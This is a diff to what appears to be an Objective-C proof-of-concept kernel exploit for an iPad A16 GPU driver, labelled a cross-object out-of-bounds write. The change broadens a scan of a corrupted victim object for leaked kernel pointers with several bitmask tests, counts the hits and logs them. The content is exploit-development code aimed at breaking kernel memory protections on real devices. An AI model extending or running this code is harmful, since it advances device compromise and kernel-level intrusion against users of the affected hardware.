@@ -165,7 +165,7 @@ static uint64_t agx_map_surface(uint32_t surface_id, uint64_t *span, io_connect_
     return output[0];
 }
 
-// MARK: - Cross-Object OOB Write
+// MARK: - Cross-Object OOB Write with Kernel Pointer Scan
 
 static int test_cross_object_write(void) {
     NSLog(@"=== F1OOB iPad A16 Runtime Loading PoC ===");
@@ -253,11 +253,22 @@ static int test_cross_object_write(void) {
             
             // Scan for kernel pointers in victim
             NSLog(@"[XOBJ] Scanning for kernel pointers...");
+            int ptr_count = 0;
             for (int j = 0; j < 0x10000/8; j++) {
                 uint64_t val = ((uint64_t *)victims[i].contents)[j];
-                if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff) {
+                // Check for kernel pointers (high bits set)
+                if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff || 
+                    (val >> 48) == 0xffff || (val & 0xFFFF000000000000) == 0xFFFF000000000000) {
                     NSLog(@"[XOBJ] Kernel pointer at offset 0x%x: 0x%llx", j*8, val);
+                    ptr_count++;
+                    if (ptr_count >= 20) break; // Limit output
                 }
+            }
+            
+            if (ptr_count == 0) {
+                NSLog(@"[XOBJ] No kernel pointers found in victim");
+            } else {
+                NSLog(@"[XOBJ] Found %d potential kernel pointers", ptr_count);
             }
             
             return 1;
